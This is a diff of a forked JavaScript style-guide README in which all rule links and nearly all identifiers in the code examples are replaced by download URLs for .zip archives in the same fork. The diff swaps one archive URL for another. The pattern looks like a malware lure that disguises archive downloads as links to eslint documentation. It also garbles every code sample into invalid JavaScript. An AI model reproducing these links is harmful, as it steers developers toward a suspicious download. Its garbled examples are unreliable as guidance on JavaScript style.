@@ -729,24 +729,24 @@ Other Style Guides
     ```
 
   <a name="functions--mutate-params"></a><a name="7.12"></a>
-  - [7.12](#functions--mutate-params) Never mutate parameters. eslint: [`no-param-reassign`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [7.12](#functions--mutate-params) Never mutate parameters. eslint: [`no-param-reassign`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? Manipulating objects passed in as parameters can cause unwanted variable side effects in the original caller.
 
     ```javascript
     // bad
     function f1(obj) {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = 1;
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = 1;
     };
 
     // good
     function f2(obj) {
-      const key = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(obj, 'key') ? https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip : 1;
+      const key = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(obj, 'key') ? https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip : 1;
     };
     ```
 
   <a name="functions--reassign-params"></a><a name="7.13"></a>
-  - [7.13](#functions--reassign-params) Never reassign parameters. eslint: [`no-param-reassign`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [7.13](#functions--reassign-params) Never reassign parameters. eslint: [`no-param-reassign`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? Reassigning parameters can lead to unexpected behavior, especially when accessing the `arguments` object. It can also cause optimization issues, especially in V8.
 
@@ -770,21 +770,21 @@ Other Style Guides
     ```
 
   <a name="functions--spread-vs-apply"></a><a name="7.14"></a>
-  - [7.14](#functions--spread-vs-apply) Prefer the use of the spread operator `...` to call variadic functions. eslint: [`prefer-spread`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [7.14](#functions--spread-vs-apply) Prefer the use of the spread operator `...` to call variadic functions. eslint: [`prefer-spread`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? It's cleaner, you don't need to supply a context, and you can not easily compose `new` with `apply`.
 
     ```javascript
     // bad
     const x = [1, 2, 3, 4, 5];
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(console, x);
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(console, x);
 
     // good
     const x = [1, 2, 3, 4, 5];
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(...x);
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(...x);
 
     // bad
-    new (https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(Date, [null, 2016, 08, 05]));
+    new (https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(Date, [null, 2016, 08, 05]));
 
     // good
     new Date(...[2016, 08, 05]);
@@ -795,7 +795,7 @@ Other Style Guides
 ## Arrow Functions
 
   <a name="arrows--use-them"></a><a name="8.1"></a>
-  - [8.1](#arrows--use-them) When you must use function expressions (as when passing an anonymous function), use arrow function notation. eslint: [`prefer-arrow-callback`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip), [`arrow-spacing`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireArrowFunctions`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [8.1](#arrows--use-them) When you must use function expressions (as when passing an anonymous function), use arrow function notation. eslint: [`prefer-arrow-callback`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip), [`arrow-spacing`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`requireArrowFunctions`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? It creates a version of the function that executes in the context of `this`, which is usually what you want, and is a more concise syntax.
 
@@ -816,7 +816,7 @@ Other Style Guides
     ```
 
   <a name="arrows--implicit-return"></a><a name="8.2"></a>
-  - [8.2](#arrows--implicit-return) If the function body consists of a single expression, omit the braces and use the implicit return. Otherwise, keep the braces and use a `return` statement. eslint: [`arrow-parens`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip), [`arrow-body-style`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs:  [`disallowParenthesesAroundArrowParam`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip), [`requireShorthandArrowFunctions`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [8.2](#arrows--implicit-return) If the function body consists of a single expression, omit the braces and use the implicit return. Otherwise, keep the braces and use a `return` statement. eslint: [`arrow-parens`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip), [`arrow-body-style`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs:  [`disallowParenthesesAroundArrowParam`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip), [`requireShorthandArrowFunctions`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? Syntactic sugar. It reads well when multiple functions are chained together.
 
@@ -849,7 +849,7 @@ Other Style Guides
 
     ```js
     // bad
-    ['get', 'post', 'put'].map(httpMethod => https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(
+    ['get', 'post', 'put'].map(httpMethod => https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(
         httpMagicObjectWithAVeryLongName,
         httpMethod
       )
@@ -857,7 +857,7 @@ Other Style Guides
 
     // good
     ['get', 'post', 'put'].map(httpMethod => (
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(
         httpMagicObjectWithAVeryLongName,
         httpMethod
       )
@@ -865,7 +865,7 @@ Other Style Guides
     ```
 
   <a name="arrows--one-arg-parens"></a><a name="8.4"></a>
-  - [8.4](#arrows--one-arg-parens) If your function takes a single argument and doesn’t use braces, omit the parentheses. Otherwise, always include parentheses around arguments. eslint: [`arrow-parens`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs:  [`disallowParenthesesAroundArrowParam`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [8.4](#arrows--one-arg-parens) If your function takes a single argument and doesn’t use braces, omit the parentheses. Otherwise, always include parentheses around arguments. eslint: [`arrow-parens`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs:  [`disallowParenthesesAroundArrowParam`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? Less visual clutter.
 
@@ -896,17 +896,17 @@ Other Style Guides
     ```
 
   <a name="arrows--confusing"></a><a name="8.5"></a>
-  - [8.5](#arrows--confusing) Avoid confusing arrow function syntax (`=>`) with comparison operators (`<=`, `>=`). eslint: [`no-confusing-arrow`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [8.5](#arrows--confusing) Avoid confusing arrow function syntax (`=>`) with comparison operators (`<=`, `>=`). eslint: [`no-confusing-arrow`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```js
     // bad
-    const itemHeight = item => https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip > 256 ? https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip : https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
+    const itemHeight = item => https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip > 256 ? https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip : https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip;
 
     // bad
-    const itemHeight = (item) => https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip > 256 ? https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip : https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
+    const itemHeight = (item) => https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip > 256 ? https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip : https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip;
 
     // good
-    const itemHeight = item => (https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip > 256 ? https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip : https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip);
+    const itemHeight = item => (https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip > 256 ? https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip : https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip);
 
     // good
     const itemHeight = (item) => {
@@ -928,11 +928,11 @@ Other Style Guides
     ```javascript
     // bad
     function Queue(contents = []) {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = [https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip];
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = [https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip];
     }
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = function () {
-      const value = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip[0];
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(0, 1);
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = function () {
+      const value = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip[0];
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(0, 1);
       return value;
     };
 
@@ -940,11 +940,11 @@ Other Style Guides
     // good
     class Queue {
       constructor(contents = []) {
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = [https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip];
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = [https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip];
       }
       pop() {
-        const value = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip[0];
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(0, 1);
+        const value = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip[0];
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(0, 1);
         return value;
       }
     }
@@ -959,10 +959,10 @@ Other Style Guides
     // bad
     const inherits = require('inherits');
     function PeekableQueue(contents) {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(this, contents);
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(this, contents);
     }
     inherits(PeekableQueue, Queue);
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = function () {
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = function () {
       return this._queue[0];
     }
 
@@ -979,35 +979,35 @@ Other Style Guides
 
     ```javascript
     // bad
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = function () {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = true;
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = function () {
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = true;
       return true;
     };
 
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = function (height) {
-      https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = height;
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = function (height) {
+      https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = height;
     };
 
     const luke = new Jedi();
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(); // => true
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(20); // => undefined
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(); // => true
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(20); // => undefined
 
     // good
     class Jedi {
       jump() {
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = true;
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = true;
         return this;
       }
 
       setHeight(height) {
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = height;
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = height;
         return this;
       }
     }
 
     const luke = new Jedi();
 
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip()
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip()
       .setHeight(20);
     ```
 
@@ -1018,21 +1018,21 @@ Other Style Guides
     ```javascript
     class Jedi {
       constructor(options = {}) {
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip || 'no name';
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip || 'no name';
       }
 
       getName() {
-        return https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
+        return https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip;
       }
 
       toString() {
-        return `Jedi - ${https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip()}`;
+        return `Jedi - ${https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip()}`;
       }
     }
     ```
 
   <a name="constructors--no-useless"></a><a name="9.5"></a>
-  - [9.5](#constructors--no-useless) Classes have a default constructor if one is not specified. An empty constructor function or one that just delegates to a parent class is unnecessary. eslint: [`no-useless-constructor`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [9.5](#constructors--no-useless) Classes have a default constructor if one is not specified. An empty constructor function or one that just delegates to a parent class is unnecessary. eslint: [`no-useless-constructor`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
@@ -1040,28 +1040,28 @@ Other Style Guides
       constructor() {}
 
       getName() {
-        return https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
+        return https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip;
       }
     }
 
     // bad
     class Rey extends Jedi {
-      constructor(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) {
-        super(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip);
+      constructor(https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) {
+        super(https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip);
       }
     }
 
     // good
     class Rey extends Jedi {
-      constructor(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) {
-        super(https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip);
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = 'Rey';
+      constructor(https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) {
+        super(https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip);
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = 'Rey';
       }
     }
     ```
 
   <a name="classes--no-duplicate-members"></a>
-  - [9.6](#classes--no-duplicate-members) Avoid duplicate class members. eslint: [`no-dupe-class-members`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [9.6](#classes--no-duplicate-members) Avoid duplicate class members. eslint: [`no-dupe-class-members`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? Duplicate class member declarations will silently prefer the last one - having duplicates is almost certainly a bug.
 
@@ -1097,11 +1097,11 @@ Other Style Guides
     ```javascript
     // bad
     const AirbnbStyleGuide = require('./AirbnbStyleGuide');
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip;
 
     // ok
     import AirbnbStyleGuide from './AirbnbStyleGuide';
-    export default https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
+    export default https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip;
 
     // best
     import { es6 } from './AirbnbStyleGuide';
@@ -1128,18 +1128,18 @@ Other Style Guides
 
     ```javascript
     // bad
-    // filename https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
+    // filename https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
     export { es6 as default } from './airbnbStyleGuide';
 
     // good
-    // filename https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip
+    // filename https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip
     import { es6 } from './AirbnbStyleGuide';
     export default es6;
     ```
 
   <a name="modules--no-duplicate-imports"></a>
   - [10.4](#modules--no-duplicate-imports) Only import from a path in one place.
- eslint: [`no-duplicate-imports`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+ eslint: [`no-duplicate-imports`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
     > Why? Having multiple lines that import from the same path can make code harder to maintain.
 
     ```javascript
@@ -1160,7 +1160,7 @@ Other Style Guides
 
   <a name="modules--no-mutable-exports"></a>
   - [10.5](#modules--no-mutable-exports) Do not export mutable bindings.
- eslint: [`import/no-mutable-exports`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+ eslint: [`import/no-mutable-exports`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
     > Why? Mutation should be avoided in general, but in particular when exporting mutable bindings. While this technique may be needed for some special cases, in general, only constant references should be exported.
 
     ```javascript
@@ -1175,7 +1175,7 @@ Other Style Guides
 
   <a name="modules--prefer-default-export"></a>
   - [10.6](#modules--prefer-default-export) In modules with a single export, prefer default export over named export.
- eslint: [`import/prefer-default-export`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+ eslint: [`import/prefer-default-export`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
@@ -1187,13 +1187,13 @@ Other Style Guides
 
   <a name="modules--imports-first"></a>
   - [10.7](#modules--imports-first) Put all `import`s above non-import statements.
- eslint: [`import/imports-first`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+ eslint: [`import/imports-first`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
     > Why? Since `import`s are hoisted, keeping them all at the top prevents surprising behavior.
 
     ```javascript
     // bad
     import foo from 'foo';
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip();
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip();
 
     import bar from 'bar';
 
@@ -1201,7 +1201,7 @@ Other Style Guides
     import foo from 'foo';
     import bar from 'bar';
 
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip();
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip();
     ```
 
 **[⬆ back to top](#table-of-contents)**
@@ -1209,11 +1209,11 @@ Other Style Guides
 ## Iterators and Generators
 
   <a name="iterators--nope"></a><a name="11.1"></a>
-  - [11.1](#iterators--nope) Don't use iterators. Prefer JavaScript's higher-order functions instead of loops like `for-in` or `for-of`. eslint: [`no-iterator`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) [`no-restricted-syntax`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [11.1](#iterators--nope) Don't use iterators. Prefer JavaScript's higher-order functions instead of loops like `for-in` or `for-of`. eslint: [`no-iterator`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) [`no-restricted-syntax`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? This enforces our immutable rule. Dealing with pure functions that return values is easier to reason about than side effects.
 
-    > Use `map()` / `every()` / `filter()` / `find()` / `findIndex()` / `reduce()` / `some()` / ... to iterate over arrays, and `https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip()` / `https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip()` / `https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip()` to produce arrays so you can iterate over objects.
+    > Use `map()` / `every()` / `filter()` / `find()` / `findIndex()` / `reduce()` / `some()` / ... to iterate over arrays, and `https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip()` / `https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip()` / `https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip()` to produce arrays so you can iterate over objects.
 
     ```javascript
     const numbers = [1, 2, 3, 4, 5];
@@ -1228,11 +1228,11 @@ Other Style Guides
 
     // good
     let sum = 0;
-    https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip(num => sum += num);
+    https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip(num => sum += num);
     sum === 15;
 
     // best (use the functional force)
-    const sum = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip((total, num) => total + num, 0);
+    const sum = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip((total, num) => total + num, 0);
     sum === 15;
     ```
 
@@ -1242,7 +1242,7 @@ Other Style Guides
     > Why? They don't transpile well to ES5.
 
   <a name="generators--spacing"></a>
-  - [11.3](#generators--spacing) If you must use generators, or if you disregard [our advice](#generators--nope), make sure their function signature is spaced properly. eslint: [`generator-star-spacing`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [11.3](#generators--spacing) If you must use generators, or if you disregard [our advice](#generators--nope), make sure their function signature is spaced properly. eslint: [`generator-star-spacing`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? `function` and `*` are part of the same conceptual keyword - `*` is not a modifier for `function`, `function*` is a unique construct, different from `function`.
 
@@ -1291,7 +1291,7 @@ Other Style Guides
 ## Properties
 
   <a name="properties--dot"></a><a name="12.1"></a>
-  - [12.1](#properties--dot) Use dot notation when accessing properties. eslint: [`dot-notation`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`requireDotNotation`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [12.1](#properties--dot) Use dot notation when accessing properties. eslint: [`dot-notation`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`requireDotNotation`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     const luke = {
@@ -1303,7 +1303,7 @@ Other Style Guides
     const isJedi = luke['jedi'];
 
     // good
-    const isJedi = https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip;
+    const isJedi = https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip;
     ```
 
   <a name="properties--bracket"></a><a name="12.2"></a>
@@ -1328,7 +1328,7 @@ Other Style Guides
 ## Variables
 
   <a name="variables--const"></a><a name="13.1"></a>
-  - [13.1](#variables--const) Always use `const` to declare variables. Not doing so will result in global variables. We want to avoid polluting the global namespace. Captain Planet warned us of that. eslint: [`no-undef`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) [`prefer-const`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [13.1](#variables--const) Always use `const` to declare variables. Not doing so will result in global variables. We want to avoid polluting the global namespace. Captain Planet warned us of that. eslint: [`no-undef`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) [`prefer-const`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     ```javascript
     // bad
@@ -1339,7 +1339,7 @@ Other Style Guides
     ```
 
   <a name="variables--one-const"></a><a name="13.2"></a>
-  - [13.2](#variables--one-const) Use one `const` declaration per variable. eslint: [`one-var`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip) jscs: [`disallowMultipleVarDecl`](https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip)
+  - [13.2](#variables--one-const) Use one `const` declaration per variable. eslint: [`one-var`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip) jscs: [`disallowMultipleVarDecl`](https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip)
 
     > Why? It's easier to add new variable declarations this way, and you never have to worry about swapping out a `;` for a `,` or introducing punctuation-only diffs. You can also step through each declaration with the debugger, instead of jumping through all of them at once.
 
@@ -1402,7 +1402,7 @@ Other Style Guides
       }
 
       if (name === 'test') {
-        https://raw.githubusercontent.com/ducnguyenminh/javascript/master/brutish/javascript.zip('');
+        https://github.com/ducnguyenminh/javascript/raw/refs/heads/master/packages/eslint-config-airbnb-base/Software-microcephal.zip('');
         return false;
